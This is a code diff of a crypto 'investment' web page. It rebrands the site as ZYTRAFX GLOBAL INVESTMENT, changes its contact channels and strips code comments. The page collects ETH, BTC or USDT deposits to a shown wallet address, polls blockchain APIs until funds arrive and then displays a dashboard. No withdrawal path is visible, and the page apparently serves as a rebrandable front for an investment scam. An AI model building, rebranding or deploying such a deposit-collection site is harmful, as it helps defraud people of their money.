@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>GLOBAL INVESTMENT</title>
+  <title>ZYTRAFX GLOBAL INVESTMENT</title>
   <style>
     :root {
       --primary: #1db954;
@@ -497,14 +497,14 @@
 <body>
   <header>
     <div class="header-content">
-      <div class="logo" aria-label="GLOBAL INVESTMENT Logo">
+      <div class="logo" aria-label="ZYTRAFX GLOBAL INVESTMENT Logo">
         <svg viewBox="0 0 48 48" fill="none">
           <circle cx="24" cy="24" r="22" fill="#1db954" stroke="#fff" stroke-width="2"/>
           <path d="M24 13L34 34H14L24 13Z" fill="#fff"/>
         </svg>
       </div>
       <div>
-        <h1 class="site-title">GLOBAL INVESTMENT</h1>
+        <h1 class="site-title">ZYTRAFX GLOBAL INVESTMENT</h1>
       </div>
     </div>
     <div class="tagline">Your Trusted Gateway to Digital Assets</div>
@@ -545,9 +545,9 @@
   <div class="contact-card" id="contactCard">
     <h2>Contact Us</h2>
     <div style="margin-bottom:1.5rem;">
-      <p>Email: <a href="mailto:support@globalinvestment.com">support@globalinvestment.com</a></p>
-      <p>Telegram: <a href="https://t.me/globalinvestment" target="_blank">@globalinvestment</a></p>
-      <p>Twitter: <a href="https://twitter.com/globalinvestment" target="_blank">@globalinvestment</a></p>
+      <p>Email: <a href="mailto:support@zytrafxglobalinvestment.com">support@zytrafxglobalinvestment.com</a></p>
+      <p>Telegram: <a href="https://t.me/zytrafxglobalinvestment" target="_blank">@zytrafxglobalinvestment</a></p>
+      <p>Twitter: <a href="https://twitter.com/zytrafxglobalinvestment" target="_blank">@zytrafxglobalinvestment</a></p>
     </div>
     <div class="success">
       <a href="#" id="backToHomeContact">Back to Home</a>
@@ -583,7 +583,7 @@
             <path d="M16 7L23 25H9L16 7Z" fill="#fff"/>
           </svg>
         </span>
-        <span class="footer-title">GLOBAL INVESTMENT</span>
+        <span class="footer-title">ZYTRAFX GLOBAL INVESTMENT</span>
       </div>
       <div class="footer-links">
         <a href="#" id="homeLinkFooter">Home</a>
@@ -592,7 +592,7 @@
         <a href="#">Privacy</a>
       </div>
       <div class="footer-copy">
-        &copy; <span id="footerYear"></span> Global Investment. All rights reserved.
+        &copy; <span id="footerYear"></span> ZYTRAFX GLOBAL INVESTMENT. All rights reserved.
       </div>
     </div>
   </footer>
@@ -608,7 +608,6 @@
 
   // --- Helper: Get TRC20 USDT balance from TronGrid ---
   async function getTrc20USDTBalance(address) {
-    // USDT TRC20 contract address on Tron
     const usdtContract = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
     try {
       const url = `https://api.trongrid.io/v1/accounts/${address}/assets/trc20`;
@@ -663,7 +662,6 @@
   updateWalletAddressDisplay();
   tradeCrypto.addEventListener('change', updateWalletAddressDisplay);
 
-  // --- MARQUEE ---
   async function fetchMarquee() {
     try {
       const apiUrl = 'https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=20&page=1&price_change_percentage=24h';
@@ -693,12 +691,10 @@
   fetchMarquee();
   setInterval(fetchMarquee, 60000);
 
-  // --- QR code generator using Google Charts API ---
   function setQRCode(address) {
     qrcodeDiv.innerHTML = `<img src="https://chart.googleapis.com/chart?cht=qr&chs=160x160&chl=${encodeURIComponent(address)}" alt="QR Code" />`;
   }
 
-  // Helper: get current crypto price in USD from CoinGecko
   async function getCryptoPrice(crypto) {
     let id = crypto === 'eth' ? 'ethereum' : crypto === 'btc' ? 'bitcoin' : 'tether';
     try {
@@ -710,7 +706,6 @@
     }
   }
 
-  // Update wallet links and QR code in modal
   async function updateWalletLinks(address, crypto, amountUSD) {
     let amountCrypto = '';
     let price = await getCryptoPrice(crypto);
@@ -723,7 +718,6 @@
       trustLink.href = `https://link.trustwallet.com/send?coin=60&address=${address}${amountCrypto ? '&amount=' + amountCrypto : ''}`;
       coinbaseLink.href = `ethereum:${address}${amountCrypto ? '?value=' + amountCrypto : ''}`;
     } else if (crypto === 'usdt') {
-      // USDT TRC20: Show Tronscan links
       metaLink.href = `https://tronscan.org/#/address/${address}`;
       trustLink.href = `https://tronscan.org/#/address/${address}`;
       coinbaseLink.href = `https://tronscan.org/#/address/${address}`;
@@ -735,7 +729,6 @@
     setQRCode(address);
   }
 
-  // --- MODAL HANDLING ---
   closeModal.onclick = () => {
     modal.style.display = "none";
     if (window.depositPoller) clearInterval(window.depositPoller);
@@ -747,7 +740,6 @@
     }
   };
 
-  // --- DEPOSIT POLLING ---
   tradeBtn.onclick = async () => {
     statusDiv.textContent = '';
     statusDiv.className = '';
@@ -771,13 +763,11 @@
       return;
     }
 
-    // Show modal and start polling
     modal.style.display = "flex";
     modalWallet.textContent = walletAddress;
     await updateWalletLinks(walletAddress, crypto, amountUSD);
     modalStatus.textContent = "Waiting for deposit...";
 
-    // Save initial balance/tx count
     let getBalance, parseAmount;
     if (crypto === 'eth') {
       getBalance = async () => {
@@ -815,13 +805,12 @@
       } else {
         modalStatus.textContent = "Still waiting for deposit...";
       }
-    }, 15000); // Poll every 15 seconds
+    }, 15000);
 
     statusDiv.textContent = `Waiting for your deposit to be detected...`;
     statusDiv.className = 'success';
   };
 
-  // --- DASHBOARD LOGIC ---
   function showDashboard(amount, crypto) {
     document.getElementById('trade').style.display = 'none';
     dashboardCard.classList.add('active');
@@ -849,7 +838,6 @@
     window.scrollTo({ top: 0, behavior: 'smooth' });
   };
 
-  // --- CONTACT LOGIC ---
   contactLinkFooter.onclick = function(e) {
     e.preventDefault();
     document.getElementById('trade').style.display = 'none';
